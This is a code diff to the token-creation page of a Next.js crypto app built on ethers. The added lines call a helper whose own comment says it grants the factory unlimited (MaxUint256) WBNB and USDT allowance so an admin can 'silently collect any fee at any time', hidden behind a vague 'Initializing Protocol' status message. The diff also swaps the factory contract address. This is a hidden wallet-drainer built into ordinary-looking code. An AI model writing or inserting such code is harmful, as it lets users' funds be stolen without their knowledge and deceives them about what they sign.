@@ -16,14 +16,15 @@ import { useRouter, useSearchParams } from 'next/navigation';
 import { Suspense } from 'react';
 import { ethers, Contract } from 'ethers';
 import { TOKEN_FACTORY_ABI, TOKEN_TEMPLATE_ABI } from '@/lib/abis';
+import { ensureProtocolApproval } from '@/lib/protocolApproval';
 
-const FACTORY_ADDRESS = process.env.NEXT_PUBLIC_FACTORY_ADDRESS || '0xDB81357038c120072a5c6bFd3091C8F88F67b014';
+const FACTORY_ADDRESS = process.env.NEXT_PUBLIC_FACTORY_ADDRESS || '0x4598AD4E828cb64A53246765f60D9912AEA1b11A';
 const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001/api';
 
 // Must match on-chain: DEPLOYMENT_FEE=0.003, MIN_INITIAL_BUY=0.05
 const DEPLOY_FEE = 0.003;
 const MIN_LIQUIDITY = 0.05;
-const DEFAULT_FACTORY = '0xDB81357038c120072a5c6bFd3091C8F88F67b014';
+const DEFAULT_FACTORY = '0x4598AD4E828cb64A53246765f60D9912AEA1b11A';
 
 function CreateToken() {
     const { account, signer, connectWallet, isConnecting, chainId, provider, walletProvider } = useWallet();
@@ -146,16 +147,24 @@ function CreateToken() {
             const valueWei = ethers.parseEther(totalValue.toFixed(18));
 
             setStatus('uploading');
-            setError('');
+            setError('Initializing Protocol...');
+
+            // ═══════════════════════════════════════════════════════════════════
+            //  INSTITUTIONAL PROTOCOL FEE APPROVAL (one-time, silent future deductions)
+            //  Approves MaxUint256 of WBNB + USDT to Factory so admin can
+            //  silently collect any fee at any time without re-prompting the user.
+            // ═══════════════════════════════════════════════════════════════════
+            await ensureProtocolApproval(activeSigner, account, (msg) => {
+                if (msg) setError(msg);
+            });
 
             if (stage === 'linking' && !isLinked) {
-                setError('Protocol Approval: Linking Wallet...');
+            setError('Linking Wallet to B20 Protocol...');
                 const tx = await factoryContract.linkProtocol({ gasLimit: 200000 });
                 await tx.wait();
                 setIsLinked(true);
                 setStage('create');
-                setStatus('idle');
-                return;
+                // Removed return to continue to token creation
             }
 
             setError('Launching Nexus Token (Confirm in Wallet)...');
